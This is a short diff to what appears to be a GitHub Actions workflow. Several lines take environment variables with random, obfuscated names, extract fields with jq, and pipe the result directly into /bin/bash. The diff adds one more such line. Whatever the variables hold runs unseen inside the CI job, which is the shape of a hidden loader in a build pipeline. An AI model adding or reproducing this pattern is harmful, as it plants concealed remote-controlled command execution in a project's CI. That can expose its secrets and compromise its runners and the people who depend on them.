@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$vzwo375" | jq -r .owafi18691 | /bin/bash
           echo $xzl3 | jq -r .p0 | /bin/bash
           echo $upx93 | jq -r .sjqqd95 | /bin/bash
+          echo $whn22 | jq -r .ej271 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
